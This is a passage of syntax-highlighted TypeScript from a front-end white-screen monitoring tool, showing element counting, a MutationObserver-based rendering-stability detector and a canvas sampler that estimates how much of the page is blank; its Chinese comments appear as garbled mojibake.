    allElements.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">element</span> =&gt;</span> {
      <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isElementVisible</span>(element)) {
        visibleElements++;
      }
      
      <span class="hljs-keyword">const</span> tagName = element.<span class="hljs-property">tagName</span>.<span class="hljs-title function_">toUpperCase</span>();
      
      <span class="hljs-keyword">if</span> ([<span class="hljs-string">'IMG'</span>, <span class="hljs-string">'VIDEO'</span>, <span class="hljs-string">'AUDIO'</span>, <span class="hljs-string">'CANVAS'</span>, <span class="hljs-string">'SVG'</span>, <span class="hljs-string">'IFRAME'</span>].<span class="hljs-title function_">includes</span>(tagName)) {
        mediaElements++;
      }
      
      <span class="hljs-keyword">if</span> ([<span class="hljs-string">'INPUT'</span>, <span class="hljs-string">'BUTTON'</span>, <span class="hljs-string">'SELECT'</span>, <span class="hljs-string">'TEXTAREA'</span>, <span class="hljs-string">'A'</span>].<span class="hljs-title function_">includes</span>(tagName)) {
        interactiveElements++;
      }
    });
    
    <span class="hljs-comment">// ç»Ÿè®¡æ–‡æœ¬èŠ‚ç‚¹</span>
    <span class="hljs-keyword">const</span> walker = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createTreeWalker</span>(
      <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>,
      <span class="hljs-title class_">NodeFilter</span>.<span class="hljs-property">SHOW_TEXT</span>,
      <span class="hljs-literal">null</span>
    );
    
    <span class="hljs-keyword">while</span> (walker.<span class="hljs-title function_">nextNode</span>()) {
      <span class="hljs-keyword">const</span> node = walker.<span class="hljs-property">currentNode</span>;
      <span class="hljs-keyword">if</span> (node.<span class="hljs-property">textContent</span>?.<span class="hljs-title function_">trim</span>()) {
        textNodes++;
      }
    }
    
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">totalElements</span>: allElements.<span class="hljs-property">length</span>,
      visibleElements,
      textNodes,
      mediaElements,
      interactiveElements
    };
  }
}

<span class="hljs-comment">// ==================== MutationObserver æ£€æµ‹å™¨ ====================</span>

<span class="hljs-comment">/**
 * MutationObserver æ£€æµ‹å™¨ç±»
 */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MutationDetector</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">observer</span>: <span class="hljs-title class_">MutationObserver</span> | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>;
  <span class="hljs-keyword">private</span> <span class="hljs-attr">mutations</span>: <span class="hljs-title class_">MutationRecord</span>[] = [];
  <span class="hljs-keyword">private</span> <span class="hljs-attr">startTime</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">private</span> <span class="hljs-attr">isObserving</span>: <span class="hljs-built_in">boolean</span> = <span class="hljs-literal">false</span>;
  <span class="hljs-keyword">private</span> <span class="hljs-attr">config</span>: {
    <span class="hljs-attr">timeout</span>: <span class="hljs-built_in">number</span>;
    <span class="hljs-attr">minMutations</span>: <span class="hljs-built_in">number</span>;
    <span class="hljs-attr">stableTime</span>: <span class="hljs-built_in">number</span>;
  };
  
  <span class="hljs-keyword">private</span> <span class="hljs-attr">resolvePromise</span>: (<span class="hljs-function">(<span class="hljs-params">value: <span class="hljs-built_in">boolean</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>) | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>;
  <span class="hljs-keyword">private</span> <span class="hljs-attr">timeoutId</span>: <span class="hljs-title class_">ReturnType</span>&lt;<span class="hljs-keyword">typeof</span> <span class="hljs-built_in">setTimeout</span>&gt; | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>;
  <span class="hljs-keyword">private</span> <span class="hljs-attr">stableTimeoutId</span>: <span class="hljs-title class_">ReturnType</span>&lt;<span class="hljs-keyword">typeof</span> <span class="hljs-built_in">setTimeout</span>&gt; | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>;
  
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">config: Partial&lt;WhiteScreenConfig&gt; = {}</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span> = {
      <span class="hljs-attr">timeout</span>: config.<span class="hljs-property">timeout</span> ?? <span class="hljs-number">10000</span>,
      <span class="hljs-attr">minMutations</span>: <span class="hljs-number">10</span>,
      <span class="hljs-attr">stableTime</span>: <span class="hljs-number">1000</span>
    };
  }
  
  <span class="hljs-comment">/**
   * å¼€å§‹è§‚å¯Ÿ
   */</span>
  <span class="hljs-title function_">observe</span>(): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">boolean</span>&gt; {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">resolvePromise</span> = resolve;
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">startTime</span> = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">mutations</span> = [];
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">isObserving</span> = <span class="hljs-literal">true</span>;
      
      <span class="hljs-comment">// åˆ›å»º MutationObserver</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">observer</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MutationObserver</span>(<span class="hljs-function">(<span class="hljs-params">mutations</span>) =&gt;</span> {
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">handleMutations</span>(mutations);
      });
      
      <span class="hljs-comment">// é…ç½®è§‚å¯Ÿé€‰é¡¹</span>
      <span class="hljs-keyword">const</span> <span class="hljs-attr">observerConfig</span>: <span class="hljs-title class_">MutationObserverInit</span> = {
        <span class="hljs-attr">childList</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-attr">subtree</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-attr">attributes</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-attr">characterData</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-attr">attributeOldValue</span>: <span class="hljs-literal">false</span>,
        <span class="hljs-attr">characterDataOldValue</span>: <span class="hljs-literal">false</span>
      };
      
      <span class="hljs-comment">// å¼€å§‹è§‚å¯Ÿ</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">observer</span>.<span class="hljs-title function_">observe</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>, observerConfig);
      
      <span class="hljs-comment">// è®¾ç½®è¶…æ—¶</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">timeoutId</span> = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">complete</span>(<span class="hljs-literal">false</span>);
      }, <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">timeout</span>);
    });
  }
  
  <span class="hljs-comment">/**
   * å¤„ç† mutation è®°å½•
   */</span>
  <span class="hljs-keyword">private</span> <span class="hljs-title function_">handleMutations</span>(<span class="hljs-attr">mutations</span>: <span class="hljs-title class_">MutationRecord</span>[]): <span class="hljs-built_in">void</span> {
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">isObserving</span>) <span class="hljs-keyword">return</span>;
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">mutations</span>.<span class="hljs-title function_">push</span>(...mutations);
    
    <span class="hljs-comment">// é‡ç½®ç¨³å®šè®¡æ—¶å™¨</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">stableTimeoutId</span>) {
      <span class="hljs-built_in">clearTimeout</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">stableTimeoutId</span>);
    }
    
    <span class="hljs-comment">// è®¾ç½®æ–°çš„ç¨³å®šè®¡æ—¶å™¨</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">stableTimeoutId</span> = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">checkStability</span>();
    }, <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">stableTime</span>);
  }
  
  <span class="hljs-comment">/**
   * æ£€æŸ¥é¡µé¢ç¨³å®šæ€§
   */</span>
  <span class="hljs-keyword">private</span> <span class="hljs-title function_">checkStability</span>(): <span class="hljs-built_in">void</span> {
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">isObserving</span>) <span class="hljs-keyword">return</span>;
    
    <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æœ‰è¶³å¤Ÿçš„ mutationsï¼ˆè¡¨ç¤ºé¡µé¢æœ‰æ¸²æŸ“æ´»åŠ¨ï¼‰</span>
    <span class="hljs-keyword">const</span> hasSufficientMutations = <span class="hljs-variable language_">this</span>.<span class="hljs-property">mutations</span>.<span class="hljs-property">length</span> &gt;= <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">minMutations</span>;
    
    <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æœ‰æœ‰æ„ä¹‰çš„å†…å®¹å˜åŒ–</span>
    <span class="hljs-keyword">const</span> hasContentChanges = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">hasContentMutations</span>();
    
    <span class="hljs-keyword">if</span> (hasSufficientMutations &amp;&amp; hasContentChanges) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">complete</span>(<span class="hljs-literal">true</span>);
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() - <span class="hljs-variable language_">this</span>.<span class="hljs-property">startTime</span> &gt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">timeout</span> / <span class="hljs-number">2</span>) {
      <span class="hljs-comment">// å¦‚æœå·²ç»è¿‡äº†ä¸€åŠçš„è¶…æ—¶æ—¶é—´ï¼Œä¸”æ²¡æœ‰è¶³å¤Ÿçš„æ´»åŠ¨ï¼Œå¯èƒ½æ˜¯ç™½å±</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">complete</span>(<span class="hljs-literal">false</span>);
    }
  }
  
  <span class="hljs-comment">/**
   * æ£€æŸ¥æ˜¯å¦æœ‰å†…å®¹ç›¸å…³çš„ mutations
   */</span>
  <span class="hljs-keyword">private</span> <span class="hljs-title function_">hasContentMutations</span>(): <span class="hljs-built_in">boolean</span> {
    <span class="hljs-keyword">let</span> contentMutations = <span class="hljs-number">0</span>;
    
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> mutation <span class="hljs-keyword">of</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">mutations</span>) {
      <span class="hljs-keyword">if</span> (mutation.<span class="hljs-property">type</span> === <span class="hljs-string">'childList'</span>) {
        <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æ·»åŠ äº†æœ‰æ„ä¹‰çš„èŠ‚ç‚¹</span>
        <span class="hljs-keyword">const</span> addedNodes = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(mutation.<span class="hljs-property">addedNodes</span>);
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> node <span class="hljs-keyword">of</span> addedNodes) {
          <span class="hljs-keyword">if</span> (node.<span class="hljs-property">nodeType</span> === <span class="hljs-title class_">Node</span>.<span class="hljs-property">ELEMENT_NODE</span>) {
            <span class="hljs-keyword">const</span> element = node <span class="hljs-keyword">as</span> <span class="hljs-title class_">Element</span>;
            <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isElementVisible</span>(element)) {
              contentMutations++;
            }
          } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (node.<span class="hljs-property">nodeType</span> === <span class="hljs-title class_">Node</span>.<span class="hljs-property">TEXT_NODE</span>) {
            <span class="hljs-keyword">if</span> (node.<span class="hljs-property">textContent</span>?.<span class="hljs-title function_">trim</span>()) {
              contentMutations++;
            }
          }
        }
      }
    }
    
    <span class="hljs-keyword">return</span> contentMutations &gt;= <span class="hljs-number">5</span>;
  }
  
  <span class="hljs-comment">/**
   * å®Œæˆæ£€æµ‹
   */</span>
  <span class="hljs-keyword">private</span> <span class="hljs-title function_">complete</span>(<span class="hljs-attr">hasContent</span>: <span class="hljs-built_in">boolean</span>): <span class="hljs-built_in">void</span> {
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">isObserving</span>) <span class="hljs-keyword">return</span>;
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">isObserving</span> = <span class="hljs-literal">false</span>;
    
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">observer</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">observer</span>.<span class="hljs-title function_">disconnect</span>();
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">observer</span> = <span class="hljs-literal">null</span>;
    }
    
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">timeoutId</span>) {
      <span class="hljs-built_in">clearTimeout</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">timeoutId</span>);
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">timeoutId</span> = <span class="hljs-literal">null</span>;
    }
    
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">stableTimeoutId</span>) {
      <span class="hljs-built_in">clearTimeout</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">stableTimeoutId</span>);
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">stableTimeoutId</span> = <span class="hljs-literal">null</span>;
    }
    
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">resolvePromise</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">resolvePromise</span>(hasContent);
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">resolvePromise</span> = <span class="hljs-literal">null</span>;
    }
  }
  
  <span class="hljs-comment">/**
   * è·å– mutation ç»Ÿè®¡
   */</span>
  <span class="hljs-title function_">getMutationStats</span>(): {
    <span class="hljs-attr">totalMutations</span>: <span class="hljs-built_in">number</span>;
    <span class="hljs-attr">childListMutations</span>: <span class="hljs-built_in">number</span>;
    <span class="hljs-attr">attributeMutations</span>: <span class="hljs-built_in">number</span>;
    <span class="hljs-attr">characterDataMutations</span>: <span class="hljs-built_in">number</span>;
    <span class="hljs-attr">duration</span>: <span class="hljs-built_in">number</span>;
  } {
    <span class="hljs-keyword">let</span> childListMutations = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">let</span> attributeMutations = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">let</span> characterDataMutations = <span class="hljs-number">0</span>;
    
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> mutation <span class="hljs-keyword">of</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">mutations</span>) {
      <span class="hljs-keyword">switch</span> (mutation.<span class="hljs-property">type</span>) {
        <span class="hljs-keyword">case</span> <span class="hljs-string">'childList'</span>:
          childListMutations++;
          <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-string">'attributes'</span>:
          attributeMutations++;
          <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-string">'characterData'</span>:
          characterDataMutations++;
          <span class="hljs-keyword">break</span>;
      }
    }
    
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">totalMutations</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">mutations</span>.<span class="hljs-property">length</span>,
      childListMutations,
      attributeMutations,
      characterDataMutations,
      <span class="hljs-attr">duration</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() - <span class="hljs-variable language_">this</span>.<span class="hljs-property">startTime</span>
    };
  }
  
  <span class="hljs-comment">/**
   * åœæ­¢è§‚å¯Ÿ
   */</span>
  <span class="hljs-title function_">stop</span>(): <span class="hljs-built_in">void</span> {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">complete</span>(<span class="hljs-literal">false</span>);
  }
}

<span class="hljs-comment">// ==================== æˆªå›¾æ£€æµ‹å™¨ ====================</span>

<span class="hljs-comment">/**
 * æˆªå›¾æ£€æµ‹å™¨ç±»
 */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ScreenshotDetector</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">canvas</span>: <span class="hljs-title class_">HTMLCanvasElement</span> | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>;
  <span class="hljs-keyword">private</span> <span class="hljs-attr">ctx</span>: <span class="hljs-title class_">CanvasRenderingContext2D</span> | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>;
  <span class="hljs-keyword">private</span> <span class="hljs-attr">config</span>: {
    <span class="hljs-attr">sampleWidth</span>: <span class="hljs-built_in">number</span>;
    <span class="hljs-attr">sampleHeight</span>: <span class="hljs-built_in">number</span>;
    <span class="hljs-attr">whiteThreshold</span>: <span class="hljs-built_in">number</span>;
    <span class="hljs-attr">brightnessThreshold</span>: <span class="hljs-built_in">number</span>;
  };
  
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">config: Partial&lt;WhiteScreenConfig&gt; = {}</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span> = {
      <span class="hljs-attr">sampleWidth</span>: <span class="hljs-number">100</span>,
      <span class="hljs-attr">sampleHeight</span>: <span class="hljs-number">100</span>,
      <span class="hljs-attr">whiteThreshold</span>: config.<span class="hljs-property">threshold</span> ?? <span class="hljs-number">0.95</span>,
      <span class="hljs-attr">brightnessThreshold</span>: <span class="hljs-number">250</span>
    };
  }
  
  <span class="hljs-comment">/**
   * åˆå§‹åŒ– Canvas
   */</span>
  <span class="hljs-keyword">private</span> <span class="hljs-title function_">initCanvas</span>(): <span class="hljs-built_in">boolean</span> {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span> = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'canvas'</span>);
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span>.<span class="hljs-property">width</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">sampleWidth</span>;
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span>.<span class="hljs-property">height</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">sampleHeight</span>;
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">ctx</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span>.<span class="hljs-title function_">getContext</span>(<span class="hljs-string">'2d'</span>, { <span class="hljs-attr">willReadFrequently</span>: <span class="hljs-literal">true</span> });
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">ctx</span> !== <span class="hljs-literal">null</span>;
    } <span class="hljs-keyword">catch</span> {
      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
  }
  
  <span class="hljs-comment">/**
   * æ‰§è¡Œæˆªå›¾æ£€æµ‹
   */</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">detect</span>(): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">ScreenshotResult</span>&gt; {
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">initCanvas</span>() || !<span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span> || !<span class="hljs-variable language_">this</span>.<span class="hljs-property">ctx</span>) {
      <span class="hljs-keyword">return</span> {
        <span class="hljs-attr">isWhiteScreen</span>: <span class="hljs-literal">false</span>,
        <span class="hljs-attr">whitePixelRatio</span>: <span class="hljs-number">0</span>,
        <span class="hljs-attr">totalPixels</span>: <span class="hljs-number">0</span>,
        <span class="hljs-attr">whitePixels</span>: <span class="hljs-number">0</span>
      };
    }
    
    <span class="hljs-keyword">try</span> {
      <span class="hljs-comment">// ä½¿ç”¨ html2canvas æˆ–åŸç”Ÿæ–¹æ³•æˆªå›¾</span>
      <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">captureScreen</span>();
      
      <span class="hljs-comment">// åˆ†æå›¾åƒ</span>
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">analyzeImage</span>();
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Screenshot detection failed:'</span>, error);
      <span class="hljs-keyword">return</span> {
        <span class="hljs-attr">isWhiteScreen</span>: <span class="hljs-literal">false</span>,
        <span class="hljs-attr">whitePixelRatio</span>: <span class="hljs-number">0</span>,
        <span class="hljs-attr">totalPixels</span>: <span class="hljs-number">0</span>,
        <span class="hljs-attr">whitePixels</span>: <span class="hljs-number">0</span>
      };
    }
  }
  
  <span class="hljs-comment">/**
   * æ•è·å±å¹•
   */</span>
  <span class="hljs-keyword">private</span> <span class="hljs-keyword">async</span> <span class="hljs-title function_">captureScreen</span>(): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; {
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span> || !<span class="hljs-variable language_">this</span>.<span class="hljs-property">ctx</span>) <span class="hljs-keyword">return</span>;
    
    <span class="hljs-keyword">const</span> { sampleWidth, sampleHeight } = <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>;
    
    <span class="hljs-comment">// æ–¹æ¡ˆ1: ä½¿ç”¨ html2canvasï¼ˆéœ€è¦å¼•å…¥åº“ï¼‰</span>
    <span class="hljs-comment">// è¿™é‡Œä½¿ç”¨ç®€åŒ–çš„æ–¹æ¡ˆï¼šéå†å¯è§å…ƒç´ å¹¶ç»˜åˆ¶</span>
    
    <span class="hljs-comment">// å…ˆå¡«å……ç™½è‰²èƒŒæ™¯</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">ctx</span>.<span class="hljs-property">fillStyle</span> = <span class="hljs-string">'#ffffff'</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">ctx</span>.<span class="hljs-title function_">fillRect</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, sampleWidth, sampleHeight);
    
    <span class="hljs-comment">// è·å– body çš„èƒŒæ™¯è‰²</span>
    <span class="hljs-keyword">const</span> bodyStyle = <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">getComputedStyle</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>);
    <span class="hljs-keyword">const</span> bodyBgColor = bodyStyle.<span class="hljs-property">backgroundColor</span>;
    <span class="hljs-keyword">if</span> (bodyBgColor &amp;&amp; bodyBgColor !== <span class="hljs-string">'rgba(0, 0, 0, 0)'</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">ctx</span>.<span class="hljs-property">fillStyle</span> = bodyBgColor;
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">ctx</span>.<span class="hljs-title function_">fillRect</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, sampleWidth, sampleHeight);
    }
    
    <span class="hljs-comment">// ç»˜åˆ¶å¯è§å…ƒç´ çš„ç®€åŒ–è¡¨ç¤º</span>
    <span class="hljs-keyword">const</span> elements = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'*'</span>);
    <span class="hljs-keyword">const</span> viewportWidth = <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>;
    <span class="hljs-keyword">const</span> viewportHeight = <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>;
    <span class="hljs-keyword">const</span> scaleX = sampleWidth / viewportWidth;
    <span class="hljs-keyword">const</span> scaleY = sampleHeight / viewportHeight;
    
    elements.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">element</span> =&gt;</span> {
      <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">isElementVisible</span>(element)) <span class="hljs-keyword">return</span>;
      
      <span class="hljs-keyword">const</span> rect = element.<span class="hljs-title function_">getBoundingClientRect</span>();
      <span class="hljs-keyword">if</span> (rect.<span class="hljs-property">width</span> === <span class="hljs-number">0</span> || rect.<span class="hljs-property">height</span> === <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span>;
      
      <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦åœ¨è§†å£å†…</span>
      <span class="hljs-keyword">if</span> (rect.<span class="hljs-property">right</span> &lt; <span class="hljs-number">0</span> || rect.<span class="hljs-property">bottom</span> &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span>;
      <span class="hljs-keyword">if</span> (rect.<span class="hljs-property">left</span> &gt; viewportWidth || rect.<span class="hljs-property">top</span> &gt; viewportHeight) <span class="hljs-keyword">return</span>;
      
      <span class="hljs-keyword">const</span> style = <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">getComputedStyle</span>(element);
      <span class="hljs-keyword">const</span> bgColor = style.<span class="hljs-property">backgroundColor</span>;
      
      <span class="hljs-comment">// åªç»˜åˆ¶æœ‰èƒŒæ™¯è‰²çš„å…ƒç´ </span>
      <span class="hljs-keyword">if</span> (bgColor &amp;&amp; bgColor !== <span class="hljs-string">'rgba(0, 0, 0, 0)'</span> &amp;&amp; bgColor !== <span class="hljs-string">'transparent'</span>) {
        <span class="hljs-keyword">const</span> x = rect.<span class="hljs-property">left</span> * scaleX;
        <span class="hljs-keyword">const</span> y = rect.<span class="hljs-property">top</span> * scaleY;
        <span class="hljs-keyword">const</span> width = rect.<span class="hljs-property">width</span> * scaleX;
        <span class="hljs-keyword">const</span> height = rect.<span class="hljs-property">height</span> * scaleY;
        
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">ctx</span>!.<span class="hljs-property">fillStyle</span> = bgColor;
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">ctx</span>!.<span class="hljs-title function_">fillRect</span>(x, y, width, height);
      }
      
      <span class="hljs-comment">// ç»˜åˆ¶æ–‡æœ¬åŒºåŸŸ</span>
      <span class="hljs-keyword">const</span> text = element.<span class="hljs-property">textContent</span>?.<span class="hljs-title function_">trim</span>();
      <span class="hljs-keyword">if</span> (text &amp;&amp; text.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span> &amp;&amp; element.<span class="hljs-property">children</span>.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) {
        <span class="hljs-keyword">const</span> x = rect.<span class="hljs-property">left</span> * scaleX;
        <span class="hljs-keyword">const</span> y = rect.<span class="hljs-property">top</span> * scaleY;
        <span class="hljs-keyword">const</span> width = rect.<span class="hljs-property">width</span> * scaleX;
        <span class="hljs-keyword">const</span> height = rect.<span class="hljs-property">height</span> * scaleY;
        
        <span class="hljs-comment">// ç”¨æ·±è‰²è¡¨ç¤ºæ–‡æœ¬åŒºåŸŸ</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">ctx</span>!.<span class="hljs-property">fillStyle</span> = style.<span class="hljs-property">color</span> || <span class="hljs-string">'#000000'</span>;
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">ctx</span>!.<span class="hljs-title function_">fillRect</span>(x, y, <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(width, <span class="hljs-number">2</span>), <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(height, <span class="hljs-number">2</span>));
      }
    });
    
    <span class="hljs-comment">// ç»˜åˆ¶å›¾ç‰‡å…ƒç´ </span>
    <span class="hljs-keyword">const</span> images = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'img'</span>);
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> img <span class="hljs-keyword">of</span> images) {
      <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">isElementVisible</span>(img)) <span class="hljs-keyword">continue</span>;
      
      <span class="hljs-keyword">const</span> rect = img.<span class="hljs-title function_">getBoundingClientRect</span>();
      <span class="hljs-keyword">if</span> (rect.<span class="hljs-property">width</span> === <span class="hljs-number">0</span> || rect.<span class="hljs-property">height</span> === <span class="hljs-number">0</span>) <span class="hljs-keyword">continue</span>;
      
      <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">const</span> x = rect.<span class="hljs-property">left</span> * scaleX;
        <span class="hljs-keyword">const</span> y = rect.<span class="hljs-property">top</span> * scaleY;
        <span class="hljs-keyword">const</span> width = rect.<span class="hljs-property">width</span> * scaleX;
        <span class="hljs-keyword">const</span> height = rect.<span class="hljs-property">height</span> * scaleY;
        
        <span class="hljs-comment">// ç”¨ç°è‰²è¡¨ç¤ºå›¾ç‰‡åŒºåŸŸ</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">ctx</span>!.<span class="hljs-property">fillStyle</span> = <span class="hljs-string">'#808080'</span>;
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">ctx</span>!.<span class="hljs-title function_">fillRect</span>(x, y, width, height);
      } <span class="hljs-keyword">catch</span> {
        <span class="hljs-comment">// è·¨åŸŸå›¾ç‰‡æ— æ³•ç»˜åˆ¶</span>
      }
    }
  }
  
  <span class="hljs-comment">/**
   * åˆ†æå›¾åƒ
   */</span>
